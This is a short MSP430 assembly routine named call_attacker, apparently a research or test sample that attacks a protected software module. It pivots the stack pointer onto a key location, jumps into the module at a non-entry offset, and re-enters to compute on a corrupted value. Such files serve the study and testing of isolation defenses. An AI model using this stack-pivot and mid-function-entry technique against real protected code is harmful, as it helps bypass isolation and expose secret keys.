	.global call_attacker
	.global key
	.global protected

	.sect .data

backup:
	.word 0
	.word 0

	.sect .text

call_attacker:
	mova SP, &backup
	mov #key+4, SP
	; first jump to ret so we can setup a proper stack for the helper call to the multiplication routine
	calla #protected+0x1a
	mova &backup, SP
	; now re-enter and compute on the corrupted value
	calla #protected
	reta
